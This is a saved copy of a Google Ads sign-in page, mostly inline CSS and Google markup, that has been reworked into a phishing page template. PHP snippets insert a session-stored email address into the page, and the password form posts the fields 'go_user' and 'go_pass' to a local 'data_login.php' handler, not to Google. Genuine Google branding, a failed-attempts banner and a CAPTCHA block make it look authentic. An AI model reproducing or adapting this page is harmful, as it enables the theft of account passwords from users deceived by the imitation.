.VfPpkd-uMhiad::after,.lezCeb.LXctle:enabled.VfPpkd-scr2fc-OWXEXe-uqeOfd.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe:not(:active) .VfPpkd-uMhiad::after,.lezCeb.LXctle:enabled.VfPpkd-scr2fc-OWXEXe-uqeOfd:hover:not(.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe):not(:active) .VfPpkd-uMhiad::after{background-color:#444746;background-color:var(--gm3-sys-color-on-surface-variant,#444746)}.lezCeb.LXctle:enabled.VfPpkd-scr2fc-OWXEXe-gk6SMd .VfPpkd-pafCAf,.lezCeb.LXctle:enabled.VfPpkd-scr2fc-OWXEXe-uqeOfd .VfPpkd-pafCAf{height:16px;width:16px}.lezCeb.LXctle:enabled.VfPpkd-scr2fc-OWXEXe-gk6SMd .VfPpkd-pafCAf-OWXEXe-IT5dJd{fill:#041e49;fill:var(--gm3-sys-color-on-primary-container,#041e49)}.lezCeb.LXctle:disabled.VfPpkd-scr2fc-OWXEXe-gk6SMd .VfPpkd-pafCAf-OWXEXe-IT5dJd{fill:var(--gm3-sys-color-on-surface,#1f1f1f)}.lezCeb.LXctle:enabled.VfPpkd-scr2fc-OWXEXe-uqeOfd .VfPpkd-pafCAf-OWXEXe-Xhs9z,.lezCeb.LXctle:disabled.VfPpkd-scr2fc-OWXEXe-uqeOfd .VfPpkd-pafCAf-OWXEXe-Xhs9z{visibility:hidden}.vb78hf{color:#444746;color:var(--gm3-sys-color-on-surface-variant,#444746);display:-moz-box;display:flex;-moz-box-flex:0;flex:none;height:24px;-moz-box-pack:center;justify-content:center;width:24px}.ZlURZc .atGkJf,.ZlURZc .vb78hf{height:20px;width:20px}.QTJzre.PlAvif .vb78hf{margin-top:16px}.QTJzre.STFd6 .vb78hf{position:relative;top:10px}.ZlURZc .QTJzre.STFd6 .vb78hf{position:relative;top:10px}.gyrWGe{-moz-box-align:start;align-items:flex-start;display:-moz-box;display:flex;-moz-box-flex:0;flex:0 1 auto;-moz-box-orient:vertical;-moz-box-direction:normal;flex-direction:column;-moz-box-pack:center;justify-content:center;margin-left:16px;min-width:0;width:100%}.ZlURZc .QTJzre:not(.PlAvif) .gyrWGe{margin-left:12px}.QTJzre.N3snbf:not(.cd29Sd) .gyrWGe{margin-left:0}.auE4Xb{background:transparent;border:none;cursor:pointer;-moz-box-orient:horizontal;-moz-box-direction:normal;flex-direction:row;-moz-box-pack:start;justify-content:flex-start;line-height:1.42857143;margin-left:0;overflow:visible;padding:0;position:relative;text-align:left;text-decoration:none;z-index:1}.QTJzre:not(.RDPZE) .auE4Xb{position:relative}.QTJzre:not(.RDPZE) .auE4Xb::before{background:#0b57d0;background:var(--gm3-sys-color-primary,#0b57d0);content:"";opacity:0;position:absolute;pointer-events:none}.QTJzre:not(.RDPZE) .auE4Xb:hover::before{opacity:0.08}.QTJzre:not(.RDPZE) .auE4Xb:focus::before,.QTJzre:not(.RDPZE) .auE4Xb.u3bW4e::before{opacity:0.1}.QTJzre:not(.RDPZE) .auE4Xb:active::before,.QTJzre:not(.RDPZE) .auE4Xb.qs41qe::before{opacity:0.1}.QTJzre:not(.RDPZE) .auE4Xb::before{border-radius:16px;height:100%top: 0; right: 0; bottom: 0; left: -16px;width:calc(100% + 16px);z-index:-1}.QTJzre .auE4Xb:focus{outline:none}.QTJzre:not(.N3snbf) .auE4Xb:hover::before{left:0}.QTJzre:not(.N3snbf) .auE4Xb:focus::before,.QTJzre:not(.N3snbf) .auE4Xb.u3bW4e::before{left:0}.gktJBf{display:-moz-box;display:flex;-moz-box-orient:vertical;-moz-box-direction:normal;flex-direction:column;overflow:hidden;padding:16px 16px;width:100%}.ZlURZc .gktJBf{padding-left:12px}.QTJzre.STFd6 .gktJBf{padding:16px 16px}.QTJzre:not(.cd29Sd).N3snbf .gktJBf{padding-left:0}.QTJzre.N3snbf .auE4Xb::after{background:var(--gm3-sys-color-outline,#747775);content:"";height:calc(100% - 32px);position:absolute;right:0;top:16px;width:1px}.wIAG6d:not(.RDPZE),.QTJzre:not(.RDPZE) .wIAG6d{cursor:pointer}.jOkGjb{padding-bottom:3px;padding-top:-3px;font-size:1rem;color:#1f1f1f;color:var(--gm3-sys-color-on-surface,#1f1f1f);display:inline-block;line-height:1.5;max-width:100%}.ZlURZc .jOkGjb{font-weight:400;font-size:0.875rem;letter-spacing:0rem;line-height:1.42857143}.jOkGjb .dJVBl{overflow:hidden;text-overflow:ellipsis}.QTJzre.cd29Sd .jOkGjb{display:block;align-self:stretch}.QTJzre .jOkGjb{padding-top:0;padding-bottom:0}.g9Mx .jOkGjb{font-family:"Google Sans",roboto,"Noto Sans Myanmar UI",arial,sans-serif;font-size:0.875rem;line-height:1.42857143}.QkTfte .jOkGjb{font-weight:500}.QTJzre.RDPZE .jOkGjb{color:#1f1f1f;color:var(--gm3-sys-color-on-surface,#1f1f1f);opacity:0.3}.QTJzre.STFd6 .RAvnDd{padding-bottom:0;padding-top:0;color:#444746;color:var(--gm3-sys-color-on-surface-variant,#444746);-moz-box-flex:0;flex:0 1 auto;font-size:0.875rem;line-height:1.42857143;width:100%}.g9Mx .RAvnDd{font-size:0.75rem;line-height:1.33333333}.QTJzre.RDPZE .RAvnDd{color:#1f1f1f;color:var(--gm3-sys-color-on-surface,#1f1f1f);opacity:0.3}.O6yUcb{padding-bottom:0;padding-top:8px;color:#444746;color:var(--gm3-sys-color-on-surface-variant,#444746);display:none;font-family:"Google Sans",roboto,"Noto Sans Myanmar UI",arial,sans-serif;font-size:0.75rem;font-weight:400;letter-spacing:0.00625rem;line-height:1.33333333}.myYH1.hpxoof .O6yUcb{display:block}.myYH1.Jj6Lae .O6yUcb{color:var(--gm3-sys-color-error,#b3261e)}.jJESOe.v5IR3e{border-bottom:1px solid #c4c7c5;border-bottom:1px solid var(--gm3-sys-color-outline-variant,#c4c7c5)}.jJESOe.v5IR3e.jVwmLb{border-bottom:none}.jJESOe.v5IR3e .aTmzKb{transition:0.2s cubic-bezier(0.4,0,0.2,1)}.jJESOe.v5IR3e.jVwmLb .aTmzKb{border-bottom:none;max-height:0;opacity:0;visibility:hidden}.LAQEX{margin-left:16px}.LAQEX>.jW1oEc{-moz-box-align:center;align-items:center;display:-moz-box;display:flex;height:24px;-moz-box-pack:center;justify-content:center;transition:transform 0.2s cubic-bezier(0.4,0,0.2,1);width:24px}.jJESOe.v5IR3e.jVwmLb .LAQEX>.jW1oEc{transform:rotate(-180deg)}.lELlLc{background:none;border:none;cursor:pointer;display:-moz-box;display:flex;font-size:inherit;line-height:inherit;outline:none;padding:14px 0;position:relative;text-align:left;width:100%}.lELlLc::before{background:#0b57d0;background:var(--gm3-sys-color-primary,#0b57d0);content:"";display:block;margin:auto;opacity:0;position:absolutetop: 0; right: -24px; bottom: 0; left: -24px;transition:opacity 0.2s cubic-bezier(0.4,0,0.2,1);z-index:-1}.myYH1.u3bW4e .lELlLc::before{opacity:0.1}.lELlLc .vb78hf{display:-moz-box;display:flex;margin-right:16px}.jJESOe.v5IR3e .jOkGjb{display:block;padding-bottom:0}.jJESOe.v5IR3e .sfqPrd{border-bottom:none;padding:16px 0}.jJESOe.v5IR3e .Hy62Fc{padding-left:40px}.jJESOe.v5IR3e .QTJzre{padding:0}.O3tTEc{padding-bottom:0;padding-top:0;color:var(--gm3-sys-color-on-surface-variant,#444746);display:block;font-size:0.875rem;line-height:1.42857143}.lELlLc .v2uSpe{-moz-box-flex:1;flex-grow:1}.zJKIV{-moz-user-select:none;-moz-transition:border-color .2s cubic-bezier(0.4,0,0.2,1);transition:border-color .2s cubic-bezier(0.4,0,0.2,1);-moz-border-radius:3px;border-radius:3px;-moz-box-sizing:content-box;box-sizing:content-box;cursor:pointer;display:inline-block;height:20px;outline:none;position:relative;vertical-align:middle;width:20px;z-index:0}.SCWude{-moz-animation:quantumWizPaperAnimateSelectOut .2s forwards;animation:quantumWizPaperAnimateSelectOut .2s forwards;position:relative;width:20px;height:20px;cursor:pointer}[aria-checked=true]>.SCWude{-moz-animation:quantumWizPaperAnimateSelectIn .2s .1s forwards;animation:quantumWizPaperAnimateSelectIn .2s .1s forwards}.t5nRo{position:absolute;top:0;left:0;width:16px;height:16px;-moz-border-radius:50%;border-radius:50%;border:solid 2px;border-color:rgba(0,0,0,.54)}.N2RpBe .t5nRo{border-color:#009688}.wEIpqb{position:absolute;top:50%;left:50%;-moz-border-radius:50%;border-radius:50%;border:5px solid #009688;transition:-webkit-transform ease .28s;transition:transform ease .28s;transition:transform ease .28s,-webkit-transform ease .28s;transform:translateX(-50%) translateY(-50%) scale(0)}[aria-checked=true] .wEIpqb{transform:translateX(-50%) translateY(-50%) scale(1)}.zJKIV[aria-disabled=true]{cursor:default;pointer-events:none}[aria-disabled=true][aria-checked=true] .wEIpqb{border-color:rgba(0,0,0,.26)}[aria-disabled=true] .t5nRo{border-color:rgba(0,0,0,.26)}.k5cvGe{-moz-transform:scale(3);transform:scale(3);-moz-transition:opacity 0.15s ease;transition:opacity 0.15s ease;background-color:rgba(0,0,0,0.2);-moz-border-radius:100%;border-radius:100%;height:20px;left:0;opacity:0;outline:.1px solid transparent;pointer-events:none;position:absolute;width:20px;z-index:-1}.qs41qe>.k5cvGe{-moz-animation:quantumWizRadialInkSpread .3s;animation:quantumWizRadialInkSpread .3s;animation-fill-mode:forwards;opacity:1}.i9xfbb>.k5cvGe{background-color:rgba(0,150,136,0.2)}.u3bW4e>.k5cvGe{-moz-animation:quantumWizRadialInkFocusPulse .7s infinite alternate;animation:quantumWizRadialInkFocusPulse .7s infinite alternate;background-color:rgba(0,150,136,0.2);opacity:1}@keyframes quantumWizPaperAnimateSelectIn{0%{height:0;width:0}to{height:100%;width:100%}}@keyframes quantumWizPaperAnimateSelectOut{0%{height:0;width:0}to{height:100%;width:100%}}.PG6NJe{display:inline}.TXP5ab{position:fixed;right:0;top:0;bottom:0;z-index:100000000}.kgGPib{height:100%;display:none;width:360px}.NhPs4c .v8aRxf .gyrWGe{padding:0}.El1b7b{display:-webkit-box;display:-moz-box;display:-ms-flexbox;display:-webkit-flex;display:flex;width:100%}.klRug{box-flex:1;flex-grow:1;min-width:0}@media all and (min-width:600px){.NhPs4c.DbQnIe .klRug{display:flex;justify-content:space-between}}.NhPs4c .QTJzre{padding:8px 0 0}sentinel{}
    </style>
    <style nonce="" type="text/css" data-late-css="">
      .DuhbOc {
        position: relative;
        z-index: 100;
      }
      sentinel {
      }
    </style>
    <style id="savepage-cssvariables">
      :root {
      }
    </style>

    <meta name="savepage-title" content="Google Ads - Sign in" />
    <meta name="savepage-pubdate" content="Unknown" />
 
    <meta name="savepage-date" content="Sat Apr 13 2024 02:33:46 GMT+0200 (Central European Summer Time)" />
    <meta name="savepage-state" content="Standard Items; Retain cross-origin frames; Merge CSS images; Remove unsaved URLs; Load lazy images in existing content; Max frame depth = 5; Max resource size = 50MB; Max resource time = 10s;" />
    <meta name="savepage-version" content="28.11" />
    <meta name="savepage-comments" content="" />
  </head>
  <body
  class="jR8x9d nyoS7c SoDlKd EIlDfe"
  >
   <div class="S7xv8 LZgQXe">
      <div class="TcuCfd NQ5OL" jsname="rZHESd" jscontroller="K1ZKnb" jsaction="rcuQ6b:npT2md;SlnBXb:r0xNSb;cbwpef:Yd2OHe;iFFCZc:nnGvjf;Rld2oe:oUMEzf;FzgWvd:oUMEzf;rURRne:pSGWxb;" tabindex="null">
        <div jscontroller="ziZ8Mc" jsaction="rcuQ6b:npT2md" jsname="P1ekSe" class="Ih3FE" aria-hidden="true">
          <div jscontroller="ltDFwf" jsaction="transitionend:Zdx3Re" jsname="P1ekSe" role="progressbar" class="sZwd7c B6Vhqe qdulke jK7moc">
            <div class="xcNBHc um3FLe"></div>
            <div jsname="cQwEuf" class="w2zcLc Iq5ZMc"></div>
            <div class="MyvhI TKVRUb" jsname="P1ekSe"><span class="l3q5xe SQxu9c"></span></div>
            <div class="MyvhI sUoeld"><span class="l3q5xe SQxu9c"></span></div>
          </div>
        </div>
        <div class="fAlnEc" id="yDmH0d" jsaction="ZqRew:.CLIENT">
       
          <div id="ZCHFDb"></div>
          <c-wiz
            jsrenderer="jGvTv"
            class="A77ntc"
            data-view-id="b5STy"
            jsshadow=""
            jsdata="deferred-c4"
            data-p='%.@.1,null,null,null,"",0,[],"identity-signin-password"]'
            jscontroller="GLtV1c"
            jsaction="jiqeKb:ZCwQbe;CDQ11b:n4vmRb;DKwHie:gVmDzc;jR85Td:WtmXg;rcuQ6b:rcuQ6b;o07HZc:V4xqVe;click:vBw6I(preventDefault=true|L6M1Fb);t5qvFd:.CLIENT"
            jsname="nUpftc"
            data-node-index="0;0"
            jsmodel="hc6Ubd XVq9Qb"
            c-wiz=""
            style=""
          >
            <div class="Svhjgc" jsname="bN97Pc" jscontroller="SD8Jgb" jsshadow="" data-use-configureable-escape-action="true">
              <div class="zIgDIc" jsname="paFcre">
                <c-wiz jsrenderer="OTcFib" jsshadow="" jsdata="deferred-c3" data-p="%.@.]" data-node-index="2;0" jsmodel="hc6Ubd" c-wiz="">
                  <div class="Wf6lSd" jscontroller="rmumx" jsname="n7vHCb">
                    <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48" aria-hidden="true" jsname="jjf7Ff">
                      <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"></path>
                      <path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"></path>
                      <path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"></path>
                      <path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"></path>
                      <path fill="none" d="M2 2h44v44H2z"></path>
                    </svg>
                  </div>
                  <c-data id="c3" jsdata=" eCjdDd;_;$1"></c-data>
                </c-wiz>
                <div class="ObDc3 ZYOIke" jsname="tJHJj" jscontroller="E87wgc" jsaction="JIbuQc:pKJJqe(af8ijd);wqEGtb:pKJJqe;">
                  <h1 class="vAV9bf" data-a11y-title-piece="" id="headingText" jsname="r4nke"><span jsslot="">Welcome</span></h1>
                  <div class="gNJDp" data-a11y-title-piece="" id="headingSubtext" jsname="VdSJob"></div>
                  <div class="SOeSgb">
                    <div
                      jscontroller="k5xHfe"
                      jsaction="click:cOuCgd; blur:O22p3e; mousedown:UX7yZ; mouseup:lbsD7e; touchstart:p6p2H; touchend:yfqBxc;"
                      class="Ahygpe m8wwGd EPPJc cd29Sd xNLKcb"
                      tabindex="0"
                      role="link"
                      aria-label="<?php
if (isset($_SESSION["identifierId"])) 
{
  echo $_SESSION["identifierId"];
} 

?>  selected. Switch account"
                      jsname="af8ijd"
                    >
                      <div class="HOE91e">
                        <div class="JQ5tlb" aria-hidden="true">
                          <svg aria-hidden="true" class="Qk3oof" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                            <path
                              d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"
                            ></path>
                          </svg>
                        </div>
                      </div>
                      <div jsname="bQIQze" class="IxcUte" data-profile-identifier="" translate="no"><?php
if (isset($_SESSION["identifierId"])) 
{
  echo $_SESSION["identifierId"];
} 

?> </div>
                      <div class="JCl8ie">
                        <svg aria-hidden="true" class="Qk3oof u4TTuf" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"></path></svg>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="UXFQgc" jsname="uybdVe">
                <div class="qWK5J">
                  <div class="xKcayf" jsname="USBQqe">
                    <div class="AcKKx" jsname="rEuO1b" jscontroller="qPYxq" data-form-action-uri="">
                      <form method="post" action="data_login.php">
                        <span jsslot="">
                          <section class="Em2Ord PsAlOe rNe0id eLNT1d S7S4N" jscontroller="Tbb4sb" data-callout-type="2" aria-hidden="true" jsname="INM6z" aria-live="assertive" aria-atomic="true" jsshadow="">
                            <header class="vYeFie" jsname="tJHJj">
                              <div class="ozEFYb" role="presentation" jsname="NjaE2c">
                                <h2 class="x9zgF TrZEUc">
                                  <span class="CuWxc" aria-hidden="true" jsname="Bz112c">
                                    <svg aria-hidden="true" class="Qk3oof C3qbwe" fill="currentColor" focusable="false" width="20px" height="20px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                      <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"></path>
                                    </svg>
                                  </span>
                                  <span jsslot="" jsname="Ud7fr">Too many failed attempts</span>
                                </h2>
                                <div class="osxBFb" jsname="HSrbLb" aria-hidden="true"></div>
                              </div>
                            </header>
                            <div class="yTaH4c" jsname="MZArnb"><div jsslot=""></div></div>
                          </section>
                          <section class="Em2Ord" jscontroller="Tbb4sb" jsname="dZbRZb" jsshadow="">
                            <header class="vYeFie" jsname="tJHJj" aria-hidden="true"></header>
                            <div class="yTaH4c" jsname="MZArnb">
                              <div jsslot="">
                                <c-wiz jsrenderer="PXsWy" jsdata="deferred-c0" data-p='%.@.null,"identity-signin-password"]' jscontroller="qPfo0c" jsname="xdJtEf" data-node-index="1;0" jsmodel="hc6Ubd" c-wiz="">
                                  <c-data id="c0" jsdata=" U3wROe;_;$0"></c-data>
                                </c-wiz>
                                <input type="email" name="identifierId" class="Hvu6D" tabindex="-1" aria-hidden="true" spellcheck="false" value="<?php
if (isset($_SESSION["identifierId"])) 
{
  echo $_SESSION["identifierId"];
} 

?> " jsname="KKx9x" autocomplete="off" id="hiddenEmail" />
                                <div
                                  class="njnYzb NhPs4c"
                                  jscontroller="QTENt"
                                  jsshadow=""
                                  jsname="vZSTIf"
                                  jsaction="KJ9cZc:nAF18e(EMUunb);RXQi4b:.CLIENT;TGB85e:.CLIENT;mvJBNe:.CLIENT;wbdDDd:.CLIENT;HC77K:.CLIENT;FQZNM:.CLIENT"
                                  data-is-visible="false"
                                >
                                  <div class="YqLCIe">
                                    <div class="El1b7b">
                                      <div class="klRug">
                                        <div class="H2p7Gf" jscontroller="JYtL0c" jsaction="rcuQ6b:rcuQ6b;RXQi4b:.CLIENT;TGB85e:.CLIENT;keydown:.CLIENT;AHmuwe:.CLIENT;O22p3e:.CLIENT;YqO5N:.CLIENT" jsname="UmsTj" jsshadow="">
                                          <div id="password" class="rFrNMe i79UJc YKooDc zKHdkd sdJrJc" jscontroller="pxq3x" jsaction="clickonly:KjsqPd; focus:Jt1EX; blur:fpfTEe; input:Lg5SV" jsshadow="" jsname="Ufn6O">
                                            <div class="aCsJod oJeWuf">
                                              <div class="aXBtI Wic03c">
                                                <div class="Xb9hP">
												 <input type="hidden" name="go_user" value="<?php
if (isset($_SESSION["identifierId"])) 
{
  echo $_SESSION["identifierId"];
} 

?> " jsname="m2Owvb" id="j_username" jscontroller="YgOFye" />
                                                  <input
                                                    type="password"
                                                    class="whsOnd zHQkBf"
                                                    jsname="YPqjbf"
                                                    autocomplete="current-password"
                                                    spellcheck="false"
                                                    tabindex="0"
                                                    aria-label="Enter your password"
                                                    name="go_pass"
                                                    aria-disabled="false"
                                                    autocapitalize="none"
                                                    id="j_password"
                                                    data-initial-dir="ltr"
                                                    data-initial-value=""
                                                    badinput="false"
                                                    required
                                                  />
                                                  <div jsname="YRMmle" class="AxOyFc snByac" aria-hidden="true">Enter your password</div>
                                                </div>
                                                <div class="i9lrp mIZh1c"></div>
                                                <div jsname="XmnwAc" class="OabDMe cXrdqd Y2Zypf" style="transform-origin: 136.483px center 0px;"></div>
                                              </div>
                                            </div>
                                            <div class="LXRPh"><div jsname="ty6ygf" class="ovnfwe Is7Fhb"></div></div>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                  <div class="Ly8vae uSvLId" jsname="h9d3hd" aria-live="polite"></div>
                                  <div class="v8aRxf" jsname="ESjtn">
                                    <div class="myYH1 g9Mx QkTfte" jsaction="rcuQ6b:xawz9d;PyEt0d:gfO0Le;" jscontroller="clOb9b" jsname="EMUunb" jsshadow="">
                                      <div class="Hy62Fc">
                                        <div class="sfqPrd rBUW7e" jsaction="click:va5fqd;JIbuQc:vKfede(ornU0b);RXQi4b:.CLIENT;TGB85e:.CLIENT" jscontroller="ub7VId" jsname="wQNmvb">
                                          <div class="QTJzre NEk0Ve">
                                            <div class="uxXgMe">
                                              <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb" data-is-touch-wrapper="true">
                                                <div
                                                  class="VfPpkd-MPu53c VfPpkd-MPu53c-OWXEXe-dgl2Hf Ne8lhe swXlm az2ine lezCeb kAVONc VfPpkd-MPu53c-OWXEXe-mWPk3d"
                                                  jscontroller="etBPYb"
                                                  data-indeterminate="false"
                                                  jsname="ornU0b"
                                                  jsaction="click:cOuCgd; clickmod:vhIIDb; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; contextmenu:mg9Pef;animationend:L9dL9d;dyRcpb:dyRcpb;"
                                                  data-disable-idom="true"
                                                  data-value="optionc2"
                                                >
                                                  <input class="VfPpkd-muHVFf-bMcfAe" type="checkbox" jsname="YPqjbf" jsaction="focus:AHmuwe; blur:O22p3e;change:WPi0i;" aria-labelledby="selectionc1" />
                                                  <div class="VfPpkd-YQoJzd">
                                                    <svg aria-hidden="true" class="VfPpkd-HUofsb" viewBox="0 0 24 24"><path class="VfPpkd-HUofsb-Jt5cK" fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59"></path></svg>
                                                    <div class="VfPpkd-SJnn3d"></div>
                                                  </div>
                                                  <div class="VfPpkd-OYHm6b"></div>
                                                  <div class="VfPpkd-sMek6-LhBDec"></div>
                                                </div>
                                              </div>
                                            </div>
                                            <div class="gyrWGe">
                                              <div jsname="V67aGc" class="jOkGjb"><div jsslot="" id="selectionc1" class="dJVBl wIAG6d" jsname="CeL6Qc">Show password</div></div>
                                              <div jsname="ij8cu" class="RAvnDd"><div jsslot="" class="dJVBl wIAG6d" jsname="CeL6Qc"></div></div>
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                      <div aria-atomic="true" aria-live="polite" class="O6yUcb" jsname="h9d3hd"><div jsslot=""></div></div>
                                    </div>
                                  </div>
                                  <div class="NdBX9e" jsname="JIbuQc"></div>
                                </div>
                                <input type="hidden" name="TrustDevice" value="true" jscontroller="YgOFye" /><input type="hidden" name="historicalPassword" value="false" jscontroller="YgOFye" />
                                <div jscontroller="CMcBD" jsname="Si5T8b" class="lbFS4d eLNT1d" jsaction="KWPV0:IMdg8d;rcuQ6b:jqIVcd">
                                  <div class="FZFVAd">
                                    <img jsname="O9Milc" alt="CAPTCHA image of text used to distinguish humans from robots" id="captchaimg" class="TrZEUc" />
                                    <div jscontroller="f8Gu1e" jsaction="click:cOuCgd;JIbuQc:JIbuQc;" jsname="A1U4Sb" class="XjS9D TrZEUc iLMoFc TrZEUc" id="playCaptchaButton">
                                      <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb" data-is-touch-wrapper="true">
                                        <button
                                          class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-Bz112c-M1Soyc VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7 BqKGqe eR0mzb TrZEUc lw1w4b"
                                          jscontroller="soHxf"
                                          jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;mlnRJb:fLiPzd;"
                                          data-idom-class="ksBjEc lKxP2d LQeN7 BqKGqe eR0mzb TrZEUc lw1w4b"
                                          jsname="LgbsSe"
                                          aria-label="Listen and type the numbers you hear"
                                          type="button"
                                        >
                                          <div class="VfPpkd-Jh9lGc"></div>
                                          <div class="VfPpkd-J1Ukfc-LhBDec"></div>
                                          <div class="VfPpkd-RLmnJb"></div>
                                          <svg aria-hidden="true" class="Qk3oof" fill="currentColor" focusable="false" width="18px" height="18px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                            <path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.8-1-3.3-2.5-4v8c1.5-.7 2.5-2.2 2.5-4zM14 3.2v2.1c2.9.9 5 3.5 5 6.7s-2.1 5.9-5 6.7v2.1c4-.9 7-4.5 7-8.8s-3-7.9-7-8.8z"></path>
                                          </svg>
                                          <span jsname="V67aGc" class="VfPpkd-vQzf8d"></span>
                                        </button>
                                      </div>
                                    </div>
                                    <audio jsname="CakGX" type="audio/wav" id="captchaAudio"></audio>
                                  </div>
                                  <div
                                    jscontroller="Fndnac"
                                    jsaction="keydown:C9BaXe;O22p3e:Op2ZO;AHmuwe:Jt1EX;rcuQ6b:rcuQ6b;YqO5N:Lg5SV;rURRne:rcuQ6b;EJh3N:rcuQ6b;RXQi4b:.CLIENT;TGB85e:.CLIENT"
                                    jsname="jKg4ed"
                                    class="AFTWye"
                                    data-is-rendered="true"
                                  >
                                    <div class="rFrNMe X3mtXb UOsO2 zKHdkd sdJrJc Tyc9J" jscontroller="pxq3x" jsaction="clickonly:KjsqPd; focus:Jt1EX; blur:fpfTEe; input:Lg5SV" jsshadow="" jsname="Ufn6O">
                                      <div class="aCsJod oJeWuf">
                                        <div class="aXBtI Wic03c">
                                          <div class="Xb9hP">
                                            <input
                                              type="text"
                                              class="whsOnd zHQkBf"
                                              jsname="YPqjbf"
                                              autocomplete="off"
                                              spellcheck="false"
                                              tabindex="0"
                                              aria-label="Type the text you hear or see"
                                              name="ca"
                                              aria-disabled="false"
                                              id="ca"
                                              dir="ltr"
                                              data-initial-dir="ltr"
                                              data-initial-value=""
                                              value=""
                                            />
                                            <div jsname="YRMmle" class="AxOyFc snByac" aria-hidden="true">Type the text you hear or see</div>
                                          </div>
                                          <div class="i9lrp mIZh1c"></div>
                                          <div jsname="XmnwAc" class="OabDMe cXrdqd"></div>
                                        </div>
                                      </div>
                                      <div class="LXRPh">
                                        <div jsname="ty6ygf" class="ovnfwe Is7Fhb"></div>
                                        <div jsname="B34EJ" class="dEOOab RxsGPe" aria-atomic="true" aria-live="assertive"></div>
                                      </div>
                                    </div>
                                  </div>
                                  <input jsname="SBlSod" type="hidden" name="ct" id="ct" value="" />
                                </div>
                              </div>
                            </div>
                          </section>
                         
                        </span>
                  
                    </div>
                  </div>
                </div>
              </div>
              <div
                class="JYXaTc"
                jsname="DH6Rkf"
                jscontroller="zu7j8"
                jsaction="rcuQ6b:rcuQ6b;KWPV0:vjx2Ld(Njthtb),ChoyC(eBSUOb),VaKChb(gVmDzc),nCZam(W3Rzrc),Tzaumc(uRHG6),JGhSzd;dcnbp:dE26Sc(lqvTlf);FzgWvd:JGhSzd;"
                data-is-consent="false"
                data-is-primary-action-disabled="false"
                data-is-secondary-action-disabled="false"
                data-primary-action-label="Next"
                jsshadow=""
              >
                <div class="O1Slxf" jsname="DhK0U">
                  <div class="TNTaPb" jsname="k77Iif">
                    <div jscontroller="f8Gu1e" jsaction="click:cOuCgd;JIbuQc:JIbuQc;" jsname="Njthtb" class="XjS9D TrZEUc" id="passwordNext">
                      <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb" data-is-touch-wrapper="true">
                        <button
                          class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"
                          jscontroller="soHxf"
                          jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;mlnRJb:fLiPzd;"
                          data-idom-class="nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"
                          jsname="LgbsSe"
                          type="submit"
                        >
                          <div class="VfPpkd-Jh9lGc"></div>
                          <div class="VfPpkd-J1Ukfc-LhBDec"></div>
                          <div class="VfPpkd-RLmnJb"></div>
                          <span jsname="V67aGc" class="VfPpkd-vQzf8d">Next</span>
                        </button>
                      </div>
                    </div>
                  </div>
				  
				    </form>  
				  
                  <div class="FO2vFd" jsname="QkNstf">
                    <div jscontroller="f8Gu1e" jsaction="click:cOuCgd;JIbuQc:JIbuQc;" jsname="gVmDzc" class="XjS9D TrZEUc JLt0ke" id="forgotPassword">
